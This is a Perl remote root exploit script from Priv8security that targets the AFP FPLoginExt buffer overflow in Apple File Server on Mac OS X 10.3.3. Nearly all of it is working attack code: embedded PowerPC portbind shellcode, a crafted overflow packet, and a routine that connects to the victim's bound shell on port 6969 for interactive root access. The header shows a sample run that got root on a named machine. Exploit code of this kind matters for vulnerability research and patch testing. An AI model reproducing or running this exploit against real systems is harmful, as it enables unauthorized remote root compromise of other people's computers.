#!/usr/bin/perl
# Priv8security com remote root exploit for AppleFileServer.
# PUBLIC VERSION!!!!
#
# Bug found by Dave G. and Dino Dai Zovi.
# URL: http://www.atstake.com/research/advisories/2004/a050304-1.txt
#
# [wsxz@localhost buffer]$ perl priv8afp.pl -h 10.4.12.199 -t 0
# -=[Priv8security.com Apple File Server remote root exploit!]=-
#
# [+] Using target: MacOSX 10.3.3
# [+] Using ret: 0xf0101cb0
# [+] Sending Request Opensession... DOne!
# [+] Got response packet:
# Flags: 1 Cmd: 4 ID: 31337
# [+] Sending FPloginEXT packet... DOne!
# [+] Waiting... We got in =)
#
# ****** Welcome to 'Adriano-Limas-Computer' ******
#
# Darwin Adriano-Limas-Computer.local 7.3.1 Darwin Kernel Version 7.3.1: Mon Mar
# 22 21:48:41 PST 2004; root:xnu/xnu-517.4.12.obj~2/RELEASE_PPC Power Macintosh powerpc
# uid=0(root) gid=0(wheel) groups=0(wheel), 1(daemon), 2(kmem), 3(sys), 4(tty),
# 5(operator), 20(staff), 31(guest), 80(admin)
#
####################################################################
use IO::Socket;

use Getopt::Std; getopts('h:t:p:o:', \%args);
if (defined($args{'h'})) { $host = $args{'h'}; }
if (defined($args{'t'})) { $target = $args{'t'}; }
if (defined($args{'p'})) { $port = $args{'p'};}else{$port = 548;}
if (defined($args{'o'})) { $offset = $args{'o'}; }else{$offset = 0;}


my @targets = (
# description, ret, Magic size.
["MacOSX 10.3.3", 0xf0101cb0, 4], #tested on my ibook g4
);

print STDERR "-=[Priv8security.com Apple File Server remote root exploit!]=-\n\n";

if (!defined($host) || !defined($target)) {
Usage();
}

($desc,$ret,$msize) = @{$targets[$target]};

print STDERR "[+] Using target: $desc\n";
print STDERR "[+] Using ret: 0x" . sprintf('%lx', $ret + $offset) . "\n";

$shellcode = # portbind shellcode by br00t [at] blueyonder.co.uk
"\x7c\xa5\x2a\x79\x40\x82\xff\xfd\x7d\x68\x02\xa6\x3b\xeb\x01\x70".
"\x39\x80\x01\x70\x3b\xdf\xff\x88\x7c\xbe\x29\xae\x3b\xdf\xff\x89".
"\x7c\xbe\x29\xae\x3b\xdf\xff\x8a\x7c\xbe\x29\xae\x3b\xdf\xff\x8b".
"\x7c\xbe\x29\xae\x38\x6c\xfe\x92\x38\x8c\xfe\x91\x38\xac\xfe\x96".
"\x38\x0c\xfe\xf1\x44\xff\xff\x02\x60\x60\x60\x60\x7c\x67\x1b\x78".
"\x38\x9f\xff\x84\x38\xac\xfe\xa0\x38\x0c\xfe\xf8\x44\xff\xff\x02".
"\x60\x60\x60\x60\x7c\xe3\x3b\x78\x38\x8c\xfe\x91\x38\x0c\xfe\xfa".
"\x44\xff\xff\x02\x60\x60\x60\x60\x7c\xe3\x3b\x78\x38\x8c\xfe\x90".
"\x38\xac\xfe\x90\x38\x0c\xfe\xae\x44\xff\xff\x02\x60\x60\x60\x60".
"\x38\x8c\xfe\x90\x38\x0c\xfe\xea\x44\xff\xff\x02\x60\x60\x60\x60".
"\x38\x8c\xfe\x91\x38\x0c\xfe\xea\x44\xff\xff\x02\x60\x60\x60\x60".
"\x38\x8c\xfe\x92\x38\x0c\xfe\xea\x44\xff\xff\x02\x60\x60\x60\x60".
"\x38\x0c\xfe\x92\x44\xff\xff\x02\x60\x60\x60\x60\x39\x1f\xff\x83".
"\x7c\xa8\x29\xae\x38\x7f\xff\x7c\x90\x61\xff\xf8\x90\xa1\xff\xfc".
"\x38\x81\xff\xf8\x38\x0c\xfe\xcb\x44\xff\xff\x02\x41\x41\x41\x41".
"\x41\x41\x41\x41\x2f\x62\x69\x6e\x2f\x73\x68\x58\xff\x02\x1b\x39".
"\x41\x41\x41\x41";

$bin_ret = reverse(pack('l', ($ret + $offset)));

$buffer = "\x60" x 141;
$buffer .= $bin_ret;
$buffer .= "\x60" x (824 - length($shellcode));
$buffer .= $shellcode;
$buffer .= "A" x 100;

$req =
"\x00\x04".# Request Opensession
"\x7a\x69\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

$packet = 
"\x00". # Request
"\x02". # Command
"\x7a\x69".# leet ID
"\x00\x00\x00\x00".# Data Offset
"\x00\x00\x04\x00".# Length
"\x00\x00\x00\x00".# Reserved
"\x3f". # FPloginext
"\x00". # Pad
"\x00\x00". # Flags
"\x0e\x41\x46\x50\x56\x65\x72\x73\x69\x6f\x6e\x20\x32\x2e\x31".# Version
"\x10\x43\x6c\x65\x61\x72\x74\x78\x74\x20\x70\x61\x73\x73\x77\x72\x64". # UAM
"\x03". # Type
"\x00\x07". # User Len
"\x41\x64\x72\x69\x61\x6e\x6f" .# AFPNAME USER
"\x03". # Pathtype
"\x80\xff". # Path Len
$buffer. # Evil String
"\x00"; # Pad

$len = reverse(pack("S", $msize));

substr($packet, 63 , 2, $len);

$f = IO::Socket::INET->new(Proto=>"tcp", PeerHost=>$host,PeerPort=>$port)
or die "[-] Cant connect: $!\n\n";

print STDERR "[+] Sending Request Opensession... ";

$f->send($req);
print STDERR "DOne!\n";

$f->recv($crap,128);
if($crap){
print STDERR "[+] Got response packet:\n";
parse_packet($crap);
}

print STDERR "[+] Sending FPloginEXT packet... ";
$f->send($packet);
print STDERR "DOne!\n";
print STDERR "[+] Waiting... ";

sleep(5);

$sc = IO::Socket::INET->new(Proto=>"tcp", PeerHost=>$host,PeerPort=>6969,Type=>SOCK_STREAM,Reuse=>1)
or die "No luck :( $!\n\n";

print "We got in =)\n";

$sc->autoflush(1);

sleep(2);

print $sc "echo;echo \"****** Welcome to '`hostname -s`' ******\"\n";
print $sc "echo;uname -a;id;echo\n";

die "cant fork: $!" unless defined($pid = fork());

if ($pid) {
while(defined ($line = <$sc>)) {
print STDOUT $line;
}
kill("TERM", $pid);
}
else
{
while(defined ($line = <STDIN>)) {
print $sc $line;
}
}
close($sc);
print "Good bye!!\n";

sub parse_packet
{
my ($buf) = shift @_;
my (@packet);
my ($i);

for ($i=0;$i<length($buf);$i++)
{
push(@packet, substr($buf, $i, 1));
}

my ($flags) = unpack("C", @packet[0]);
my ($cmd) = unpack("C", @packet[1]);

my ($request_id) = unpack("n", @packet[2] . @packet[3]);
print " Flags: $flags Cmd: $cmd ID: $request_id\n";

}


sub Usage {

print STDERR "Options:
-h Victim ip.
-t Target number from list.
-p Port to attack.
-o Offset, try in steps of 500.\n\n";

print STDERR "Targets:\n";
for($i=0; $i < @targets; $i++){
($dd) = @{$targets[$i]};
print STDERR " $i - $dd\n";
}
print STDERR "\nUsage: perl $0 -h Victim -t target\n\n";
exit;
}
